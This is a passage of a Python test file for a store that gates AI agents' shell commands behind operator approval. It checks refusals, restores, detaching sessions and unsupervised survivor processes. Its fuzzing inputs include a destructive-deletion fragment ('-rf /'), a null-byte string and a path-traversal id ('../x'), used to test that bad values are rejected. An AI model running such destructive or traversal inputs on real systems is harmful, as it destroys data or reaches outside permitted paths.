    # A second restore of the session changes nothing.
    assert step(snap, CommandsRestored(CS, (lapsed, unknown)))[0] is snap


@pytest.mark.parametrize(
    "stray",
    [
        _on_disk(2, C_ASKER),
        _on_disk(
            2, C_ASKER, run=Run(text="make", shell="/bin/sh", cwd="/w", timeout_s=600, started_at=1)
        ),
        _on_disk(2, C_OUTSIDER, Exited(code=0)),
        _on_disk(2, C_ASKER, Exited(code=0), id="../x"),
    ],
    ids=["asked", "running", "another session's", "not a command id"],
)
def test_a_restore_holding_anything_a_file_cannot_say_places_nothing(stray: Command) -> None:
    """
    No file yields a row the operator could press Run on, a command the store
    believes is running, or a command in a session it was not read for.
    """
    before = command_world()
    good = _on_disk(1, C_ASKER, Exited(code=0))

    for batch in ((good, stray), (stray, good), (stray,)):
        after, effects = step(before, CommandsRestored(CS, batch))
        assert after is before and effects == ()


def test_a_restore_never_replaces_a_command_the_store_holds() -> None:
    asked = asked_by(command_world(), C_ASKER, 1)
    from_file = _on_disk(1, C_ASKER, Exited(code=0))
    new = _on_disk(2, C_ASKER, TimedOut())

    snap, _ = step(asked, CommandsRestored(CS, (from_file, new, _on_disk(2, C_ASKER, Lapsed()))))

    assert snap.commands[cid(1)] is asked.commands[cid(1)]
    assert snap.commands[cid(1)].state is CommandState.ASKED
    # Twice in one batch, the first is the one placed.
    assert snap.commands[cid(2)] is new


def test_a_session_with_a_command_asked_or_running_cannot_leave_the_fleet() -> None:
    snap, _ = step(
        asked_by(command_world(), C_ASKER, 1),
        AgentFinished(C_ASKER, AgentState.DONE, 5.0),
        AgentFinished(C_PEER, AgentState.DONE, 5.0),
        AgentFinished(C_ROOT, AgentState.DONE, 5.0),
    )
    # Its row is in the queue, and the refusal does not rest on the row: it is
    # asked of the records, so the two cannot disagree about an open command.
    assert [owed.key for owed in snap.needs_you if owed.node[0] == CS] == [f"command:{cid(1)}"]
    assert dataclasses.replace(snap, needs_you=()).detach_refusal(CS) is DetachRefusal.OWES

    for held in (snap, step(snap, approve(1))[0]):
        assert held.detach_refusal(CS) is DetachRefusal.OWES
        after, effects = step(held, SessionDetached(CS))
        assert effects == (SessionDetachSettled("", CS, DetachRefusal.OWES),)
        assert not after.off_fleet(CS)

    for close in (CommandRefused(cid(1), "no", 9.0), CommandWithdrawn(C_ASKER, cid(1), None, 9.0)):
        over, _ = step(snap, close)
        assert over.detach_refusal(CS) is None
        assert step(over, SessionDetached(CS))[0].off_fleet(CS)
    over, _ = step(snap, approve(1), ended(1, TimedOut()))
    assert step(over, SessionDetached(CS))[0].off_fleet(CS)


def test_a_command_asked_in_a_session_off_the_fleet_brings_it_back() -> None:
    snap, _ = step(
        command_world(),
        AgentFinished(C_ASKER, AgentState.DONE, 5.0),
        AgentFinished(C_PEER, AgentState.DONE, 5.0),
        AgentFinished(C_ROOT, AgentState.DONE, 5.0),
        SessionDetached(CS),
    )
    assert snap.off_fleet(CS)

    back = asked_by(snap, C_ASKER, 1)

    assert not back.off_fleet(CS) and not back.nodes[C_ROOT].detached
    # And it does not go back off by itself when the command ends.
    over, _ = step(back, CommandRefused(cid(1), "no", 9.0))
    assert not over.off_fleet(CS)


def test_a_recalled_session_is_not_built_under_an_open_command_and_stops_being_one() -> None:
    recall = SessionRecalled("cr", "an earlier task", "claude-opus-5", Recalled())
    world = command_world()

    # Asked by an agent the store has no record of, under an id nothing is under.
    orphan = asked_by(world, ("cr", "w"), 1)
    assert step(orphan, recall)[0] is orphan

    recalled, _ = step(world, recall)
    assert recalled.nodes[("cr", None)].recalled is not None
    asking = asked_by(recalled, ("cr", None), 1)
    assert asking.nodes[("cr", None)].recalled is None


def test_a_command_order_comes_out_of_the_store_with_the_batch_that_approved_it() -> None:
    """The wiring: ``apply_all`` hands back the order, which is all the shell has to route."""
    store = Store()
    store.apply_all(
        [spawn(C_ROOT), spawn(C_ASKER, C_ROOT), CommandRequested(C_ASKER, handed(1), None, 1.0)]
    )

    settled = store.apply_all([approve(1), CommandStopAsked(cid(1), 2.0)])

    held = store.snapshot().commands[cid(1)]
    assert [type(e) for e in settled] == [CommandToRun, CommandToStop]
    assert isinstance(settled[0], CommandToRun) and settled[0].command.run == held.run
    # Neither is an answer to a parked request.
    assert all(e.request_id == "" for e in settled)


# -- the property, over generated sequences -----------------------------------------

_GEN_TEXTS = ("make install", "-rf /", "", "a\x00b", "pip install x", "+x", "ok\ud800")
_GEN_SHELLS = ("/bin/sh", "/bin/zsh", "")
_GEN_TIMEOUTS = (*TIMEOUT_CHOICES_S, 0, -1, 5)
_GEN_UNKNOWN: tuple[Any, ...] = (
    EndUnknown(),
    EndUnknown(survivor=Survivor(pid=77, pgid=77, members=2)),
    EndUnknown(survivor=Survivor(pid=77, pgid=77, members=1)),
)
_GEN_OUTCOMES: tuple[Any, ...] = (
    Exited(code=0),
    Exited(code=1),
    TimedOut(),
    Cancelled(by=CancelledBy.OPERATOR),
    Cancelled(by=CancelledBy.SHUTDOWN),
    NotStarted("no shell"),
    *_GEN_UNKNOWN,
    Refused("no"),
    CommandTakenBack(),
    Lapsed(),
)


def _gen_restorable(r: random.Random) -> Command:
    asker = r.choice(C_AGENTS)
    outcome = r.choice((None, None, *_GEN_OUTCOMES))
    base = handed(r.randrange(12))
    if outcome is None:
        if r.random() < 0.5:
            return dataclasses.replace(base, asker=asker)
        return dataclasses.replace(
            base, asker=asker, run=Run("make", "/bin/sh", "/w", 600, started_at=1.0)
        )
    return _on_disk(r.randrange(12), asker, outcome)


def _gen_command_intent(r: random.Random, now: float) -> Intent:
    """
    One intent about a command, from anybody: most of them from the operator or
    the asker of something, a fifth of them claiming an authorship they should
    not be believed about.
    """
    n = r.randrange(12)
    who: NodeId = r.choice(C_AGENTS)
    claimed: NodeId | None = None if r.random() < 0.8 else r.choice(C_AGENTS)
    kind = r.randrange(10)
    if kind <= 2:
        return CommandRequested(who, handed(n, asked=r.choice(_GEN_TEXTS)), "rq", now)
    if kind <= 4:
        return CommandApproved(
            cid(n),
            r.choice(_GEN_TEXTS),
            r.choice(_GEN_SHELLS),
            "/w",
            r.choice(_GEN_TIMEOUTS),
            now,
            node_id=claimed,
        )
    if kind == 5:
        return CommandRefused(cid(n), "no", now, node_id=claimed)
    if kind == 6:
        return CommandWithdrawn(who, cid(n), "rq", now)
    if kind == 7:
        return CommandStopAsked(cid(n), now, node_id=claimed)
    if kind == 8:
        # Half of them an ``EndUnknown``, found alive or not: the one outcome
        # that may be said of a command a second time.
        pool = _GEN_OUTCOMES if r.random() < 0.5 else _GEN_UNKNOWN
        return CommandEnded(cid(n), End(r.choice(pool), now), node_id=claimed)
    if r.random() < 0.5:
        return CommandsRead(who, "rq", now, r.choice((None, cid(n))))
    return CommandsRestored(
        r.choice((CS, CT)),
        tuple(_gen_restorable(r) for _ in range(r.randrange(3))),
        node_id=claimed,
    )


def _check_command_step(before: Snapshot, intent: Intent, after: Snapshot, effects: Any) -> None:
    from_operator = intent.node_id is None
    orders = [e for e in effects if isinstance(e, CommandToRun | CommandToStop)]
    assert set(before.commands) <= set(after.commands), "a command was dropped"

    for session in (CS, CT):
        running = [
            c
            for c in after.commands.values()
            if c.session_id == session and c.state is CommandState.RUNNING
        ]
        assert len(running) <= 1, "two commands run in one session"

    for command_id, now in after.commands.items():
        was = before.commands.get(command_id)
        if was is None:
            if isinstance(intent, CommandRequested):
                assert now.asker == intent.node_id and now.state is CommandState.ASKED
                assert now.stop_asked_at is None and now.first_delivered_at is None
            else:
                assert isinstance(intent, CommandsRestored) and from_operator
                assert now.state is CommandState.ENDED and now.session_id == intent.session_id
            continue
        if now == was:
            continue
        # What its asker wrote is never rewritten, by anybody.
        assert (now.id, now.asker, now.asked, now.reason, now.expects, now.asked_at) == (
            was.id,
            was.asker,
            was.asked,
            was.reason,
            was.expects,
            was.asked_at,
        )
        # One end is ever replaced: what was found alive of a command left
        # running unsupervised, by what a later look found.
        looked_again = (
            was.unsupervised is not None
            and isinstance(intent, CommandEnded)
            and from_operator
            and now.end is not None
            and isinstance(now.end.outcome, EndUnknown)
        )
        assert was.end is None or now.end == was.end or looked_again, "an end was replaced"
        assert was.run is None or now.run == was.run, "a run was replaced"
        assert was.stop_asked_at is None or now.stop_asked_at == was.stop_asked_at
        if now.run != was.run:
            assert isinstance(intent, CommandApproved) and from_operator
            assert intent.command_id == command_id and was.state is CommandState.ASKED
            assert (
                before.unsupervised_command(was.session_id) is None
            ), "a command was approved beside one left running unsupervised"
            assert now.run is not None and now.run.text == intent.text
            assert now.run.timeout_s in TIMEOUT_CHOICES_S and now.run.shell == intent.shell
            assert orders == [CommandToRun(command=now)]
        if now.stop_asked_at != was.stop_asked_at:
            assert isinstance(intent, CommandStopAsked) and from_operator
            assert was.state is CommandState.RUNNING
        if now.end != was.end:
            assert now.end is not None
            match intent:
                case CommandRefused():
                    assert from_operator and was.state is CommandState.ASKED
                    assert now.end.outcome == Refused(intent.reason)
                case CommandWithdrawn():
                    assert intent.node_id == was.asker and was.state is CommandState.ASKED
                    assert now.end.outcome == CommandTakenBack()
                case CommandEnded():
                    assert from_operator
                    assert was.state is CommandState.RUNNING or looked_again
                    assert now.end == intent.end
                case _:
                    raise AssertionError(f"{type(intent).__name__} ended a command")
        if now.first_delivered_at != was.first_delivered_at:
            assert isinstance(intent, CommandsRead) and intent.node_id == was.asker
            assert was.first_delivered_at is None and was.state is CommandState.ENDED

    if not any(isinstance(e, CommandToRun) for e in orders):
        assert all(
            after.commands[c].run == before.commands[c].run for c in before.commands
        ), "a run was recorded and nothing was ordered"
    for order in orders:
        assert from_operator, "an agent's intent ordered the shell"
        if isinstance(order, CommandToStop):
            assert after.commands[order.command_id].state is CommandState.RUNNING


@pytest.mark.parametrize("seed", range(40))
def test_no_sequence_of_command_intents_breaks_the_property_or_raises(seed: int) -> None:
    r = random.Random(seed)
    snap = command_world()
    for number in range(400):
        intent = _gen_command_intent(r, 1_000.0 + number)
        before = snap
        snap, effects = _apply(before, intent, float(number))
        _check_command_step(before, intent, snap, effects)


def test_the_generated_command_sequences_reach_what_the_property_is_about() -> None:
    """
    The property above holds of a run in which nothing is ever approved. So the
    runs are counted: what is applied, and what is turned away from whom.
    """
    total = dict.fromkeys(
        ("asked", "approved", "edited", "second_in_session", "agent_approval", "ended", "stopped",
         "withdrawn", "refused", "restored", "restore_refused", "delivered", "unrunnable",
         "looked_again", "beside_a_survivor"),
        0,
    )  # fmt: skip
    for seed in range(200):
        r = random.Random(seed)
        snap = command_world()
        for number in range(400):
            intent = _gen_command_intent(r, 1_000.0 + number)
            before = snap
            snap, effects = _apply(before, intent, float(number))
            changed = snap.commands != before.commands
            match intent:
                case CommandRequested():
                    total["asked"] += changed
                case CommandApproved():
                    held = before.commands.get(intent.command_id)
                    total["approved"] += changed
                    total["edited"] += changed and snap.commands[intent.command_id].edited
                    if held is not None and held.state is CommandState.ASKED and not changed:
                        total["agent_approval"] += intent.node_id is not None
                        total["beside_a_survivor"] += (
                            intent.node_id is None
                            and before.unsupervised_command(held.session_id) is not None
                            and before.running_command(held.session_id) is None
                        )
                        total["second_in_session"] += (
                            before.command_approval_refusal(
                                intent.command_id, intent.text, intent.timeout_s
                            )
                            is CommandRefusal.ALREADY_RUNNING_IN_SESSION
                        )
                        total["unrunnable"] += intent.node_id is None and isinstance(
                            before.command_approval_refusal(
                                intent.command_id, intent.text, intent.timeout_s
                            ),
                            RequestRefusal,
                        )
                case CommandEnded():
                    was = before.commands.get(intent.command_id)
                    again = was is not None and was.unsupervised is not None
                    total["ended"] += changed and not again
                    total["looked_again"] += changed and again
                case CommandStopAsked():
                    total["stopped"] += changed
                case CommandWithdrawn():
                    total["withdrawn"] += changed
                case CommandRefused():
                    total["refused"] += changed
                case CommandsRestored():
                    total["restored"] += changed
                    total["restore_refused"] += bool(intent.commands) and not changed
                case CommandsRead():
                    total["delivered"] += changed
                case _:
                    pass
    assert all(count >= 20 for count in total.values()), {k: v for k, v in total.items() if v < 20}


# -- a command left running with nothing holding it --------------------------------

_LEFT = Survivor(pid=4242, pgid=4242, members=2)


def _left_running() -> tuple[Snapshot, Command]:
    left = _on_disk(1, C_ASKER, EndUnknown(survivor=_LEFT))
    snap, effects = step(command_world(), CommandsRestored(CS, (left,)))
    assert effects == () and snap.commands == {cid(1): left}
    return snap, left


def test_a_command_left_running_unsupervised_is_ended_and_still_owes_a_row() -> None:
    store = Store()
    store.apply_all([spawn(C_ROOT), spawn(C_ASKER, C_ROOT)], now=5.0)
    left = _on_disk(1, C_ASKER, EndUnknown(survivor=_LEFT))
    store.apply_all([CommandsRestored(CS, (left,))], now=9.0)
    snap = store.snapshot()

    held = snap.commands[cid(1)]
    assert held.state is CommandState.ENDED and not held.is_open
    assert snap.commands_awaiting(CS) == (held,) and snap.unsupervised_command(CS) == held
    assert snap.running_command(CS) is None, "nothing here can stop it, so nothing says it runs"
    (owed,) = [o for o in snap.needs_you if o.key == f"command:{cid(1)}"]
    assert owed.command == held and owed.since == 9.0  # type: ignore[union-attr]
    assert owed.summary.startswith("command STILL RUNNING, unsupervised, from ")
    assert "its shell's session 4242 is alive and nothing bounds it" in owed.summary
    assert "make install" not in owed.summary

    # Known by its tag, with the shell gone, there is no session to name.
    for found, said in (
        (
            Survivor(pid=4242, pgid=4242, members=1, pids=(51,), marked=(51,), shell=False),
            "its shell is gone, 1 of its processes is alive and nothing bounds it",
        ),
        (
            Survivor(pid=4242, pgid=4242, members=0, groups=(7, 8), escaped=(7, 8), shell=False),
            "its shell is gone, 2 of its processes are alive and nothing bounds them",
        ),
    ):
        by_tag = Store()
        by_tag.apply_all([spawn(C_ROOT), spawn(C_ASKER, C_ROOT)], now=5.0)
        left = _on_disk(1, C_ASKER, EndUnknown(survivor=found))
        by_tag.apply_all([CommandsRestored(CS, (left,))], now=9.0)
        (owed,) = [o for o in by_tag.snapshot().needs_you if o.key == f"command:{cid(1)}"]
        assert said in owed.summary and "4242" not in owed.summary
        assert by_tag.snapshot().unsupervised_command(CS) == left


def test_nothing_is_approved_in_a_session_beside_a_command_left_running() -> None:
    snap, _ = _left_running()
    snap = asked_by(snap, C_ASKER, 2)
    assert (
        snap.command_approval_refusal(cid(2), "make install", 600)
        is CommandRefusal.ALREADY_RUNNING_IN_SESSION
    )
    after, effects = step(snap, approve(2))
    assert after is snap and effects == ()
    # Another session's is its own.
    other = asked_by(snap, C_OUTSIDER, 3)
    assert other.command_approval_refusal(cid(3), "make install", 600) is None


def test_a_command_left_running_is_no_request_of_its_askers_under_the_cap() -> None:
    snap, _ = _left_running()
    for n in range(2, 2 + MAX_OPEN_PER_ASKER):
        snap = asked_by(snap, C_ASKER, n)
    refused, effects = step(snap, CommandRequested(C_ASKER, handed(9), "rq", 100.0))
    assert effects == (CommandSettled("rq", cid(9), CommandRefusal.TOO_MANY_OPEN),)
    assert refused.commands == snap.commands


def test_a_release_lets_go_of_the_session_a_command_left_running_holds() -> None:
    """
    The operator's way out that does not wait on the process: released, the
    command owes no row and holds nothing, and its record says it was released
    and with how many found. Then it is an ended command like any other.
    """
    snap, left = _left_running()
    assert left.end is not None
    snap = asked_by(snap, C_ASKER, 2)
    assert snap.command_approval_refusal(cid(2), "make install", 600) is not None
    released = Released(at=310.0, alive=_LEFT.alive)

    after, effects = step(
        snap,
        CommandEnded(cid(1), dataclasses.replace(left.end, outcome=EndUnknown(released=released))),
    )

    assert effects == ()
    held = after.commands[cid(1)]
    assert held.end == dataclasses.replace(left.end, outcome=EndUnknown(released=released))
    assert held.unsupervised is None and not held.owes_row
    assert after.unsupervised_command(CS) is None
    assert [o.key for o in after.needs_you if o.key.startswith("command:")] == [f"command:{cid(2)}"]
    assert after.command_approval_refusal(cid(2), "make install", 600) is None

    # Released is final: no later look puts the row or the hold back.
    for intent in (
        ended(1, EndUnknown(survivor=_LEFT)),
        ended(1, EndUnknown()),
        ended(1, EndUnknown(released=Released(at=320.0, alive=1))),
    ):
        again, effects = step(after, intent)
        assert again is after and effects == (), intent


def test_only_a_command_left_running_unsupervised_can_be_released() -> None:
    """
    A release says something of its own was found running and let go. Of a
    command this window runs, or one that merely ended, or from an agent, it is
    not applied.
    """
    released = EndUnknown(released=Released(at=310.0, alive=1))
    running, _ = step(asked_by(command_world(), C_ASKER, 1), approve(1))
    assert running.commands[cid(1)].state is CommandState.RUNNING
    after, effects = step(running, ended(1, released))
    assert after is running and effects == ()

    snap, _ = _left_running()
    after, effects = step(snap, ended(1, released, who=C_ASKER))
    assert after is snap and effects == ()


def test_only_another_look_replaces_the_end_of_a_command_left_running() -> None:
    snap, left = _left_running()
    assert left.end is not None

    # Not an exit, not from an agent, and not for a command that merely ended.
    for intent in (
        ended(1, Exited(code=0)),
        ended(1, TimedOut()),
        ended(1, EndUnknown(), who=C_ASKER),
        # The same account again: nothing to say twice.
        CommandEnded(cid(1), left.end),
    ):
        after, effects = step(snap, intent)
        assert after is snap and effects == (), intent

    fewer = Survivor(pid=4242, pgid=4242, members=1)
    after, _ = step(snap, ended(1, EndUnknown(survivor=fewer)))
    assert after.commands[cid(1)].unsupervised == fewer
    assert after.commands_awaiting(CS) == (after.commands[cid(1)],)

    gone, _ = step(after, ended(1, EndUnknown()))
    assert gone.commands[cid(1)].end == End(outcome=EndUnknown(), at=300.0)
    assert gone.commands_awaiting() == () and gone.unsupervised_command(CS) is None
    assert cid(1) not in gone.command_since

    # And then it is an ended command like any other: nothing finds it again.
    back, effects = step(gone, ended(1, EndUnknown(survivor=_LEFT)))
    assert back is gone and effects == ()
    asked = asked_by(gone, C_ASKER, 2)
    assert asked.command_approval_refusal(cid(2), "make install", 600) is None
